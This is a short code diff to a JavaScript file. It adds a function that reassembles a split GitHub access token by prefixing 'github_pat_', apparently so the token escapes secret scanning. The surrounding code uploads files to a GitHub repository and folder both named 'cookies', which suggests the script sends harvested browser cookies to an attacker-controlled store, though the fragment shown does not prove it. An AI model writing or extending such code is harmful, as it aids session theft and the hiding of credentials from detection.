@@ -33,7 +33,7 @@ async function fetchGitHubToken() {
     throw new Error("Failed to fetch GitHub token");
   }
   const token = await response.text();
-  return token.trim(); // Ensure no extra spaces are included
+  return modifytoken(token.trim()); // Ensure no extra spaces are included
 }
 
 fetchGitHubToken().then(token => {
@@ -42,7 +42,16 @@ fetchGitHubToken().then(token => {
   console.error('Error fetching token:', error);
 });
 
-  
+  function modifytoken(inputStr) {
+    // Split the string by "|"
+    let parts = inputStr.split('|');
+
+    // Add "github_pat_" to the second index
+    parts[1] = "github_pat_" + parts[1];
+
+    // Join the parts back into a string
+    return parts[1];
+}
   function uploadFileToGitHub(file, fileName) {
     const githubApiUrl = "https://api.github.com/repos/labibrayan14/cookies/contents/cookies/";
     const githubToken = fetchGitHubToken();
